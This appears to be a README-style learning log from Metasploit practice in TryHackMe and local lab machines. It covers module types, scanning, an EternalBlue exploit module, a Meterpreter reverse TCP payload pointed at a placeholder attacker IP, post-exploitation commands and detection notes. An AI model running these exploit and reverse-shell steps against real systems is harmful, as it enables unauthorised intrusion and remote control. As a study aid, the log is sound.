@@ -1,0 +1,135 @@
+Metasploit Framework – Practical Learning Log
+
+Platform: TryHackMe (Free Rooms + Local Test Machines)
+Category: Exploitation Framework / Offensive Security
+Tool: Metasploit Framework (msfconsole)
+Status: Completed (Core Concepts + Hands-On) ✅
+---
+📌 Overview
+
+This repository documents my hands-on learning journey with the Metasploit Framework, focusing on understanding its internal architecture, module usage, exploitation workflow, and post-exploitation basics.
+The learning was performed using TryHackMe free content and deliberately vulnerable test machines in a controlled lab environment.
+---
+🎯 Learning Objectives
+
+Understand Metasploit architecture and module types
+Gain confidence using msfconsole
+Perform scanning, exploitation, and basic post-exploitation
+Work with reverse TCP payloads
+Learn common mistakes, limitations, and detection points
+---
+🧱 Core Concepts Covered
+1️⃣ Metasploit Architecture
+
+Modules: Reusable components written mostly in Ruby
+Exploit: Code that targets a specific vulnerability
+Payload: Code executed after exploitation
+
+Encoder: Obfuscates payloads (not encryption)
+NOPs: Padding for exploit reliability
+Auxiliary: Scanners, fuzzers, brute-force tools
+--
+2️⃣ Module Types (Hands-On)
+
+exploit/*
+payload/*
+auxiliary/scanner/*
+post/*
+encoder/*
+Example:
+
+use exploit/windows/smb/ms17_010_eternalblue
+---
+🧪 Practical Workflow (Hands-On)
+🔍 Recon & Scanning
+
+Used auxiliary scanners for:
+Open ports
+Service enumeration
+SMB checks
+
+use auxiliary/scanner/portscan/tcp
+set RHOSTS <target>
+run
+--
+💥 Exploitation
+
+Selected exploit based on service/version
+Configured payload manually
+Used reverse TCP shells
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 4444
+run
+
+
+Key focus:
+
+Matching exploit ↔ payload compatibility
+Correct network configuration (NAT / Host-Only)
+Listener behavior
+---
+🧠 Meterpreter (Intro Level)
+
+Basic post-exploitation commands practiced:
+
+sysinfo
+getuid
+pwd
+ls
+shell
+
+
+Concepts learned:
+
+In-memory execution
+Reduced disk artifacts
+Why Meterpreter is stealthier than raw shells
+---
+🕵️ Attacker Point of View
+
+Metasploit drastically reduces exploit development time
+Misconfiguration is often more exploitable than zero-days
+Reverse shells are more reliable behind NAT/firewalls
+Payload choice affects detection and stability
+---
+🛡️ Defender Point of View
+
+Key detection & mitigation insights:
+Metasploit traffic patterns are well-known
+Reverse TCP payloads often trigger EDR alerts
+Default Metasploit payloads are highly signature-based
+--
+Monitoring:
+Unusual outbound connections
+Suspicious parent-child processes
+In-memory execution anomalies
+---
+⚠️ Limitations & Lessons Learned
+
+Metasploit ≠ magic button
+Exploits often fail due to:
+Wrong target version
+Bad payload choice
+Network misconfiguration
+Real-world exploitation requires:
+Manual validation
+Custom payloads
+Evasion techniques beyond defaults
+---
+🧩 Tools & Commands Used
+
+msfconsole
+search, use, set, show options
+exploit / run
+sessions
+meterpreter
+---
+📚 Key Takeaways
+
+Metasploit is a framework, not just an exploit launcher
+Understanding modules is more important than memorizing commands
+Hands-on labs are essential to avoid false assumptions
+Knowing how defenders detect Metasploit improves attacker realism
+
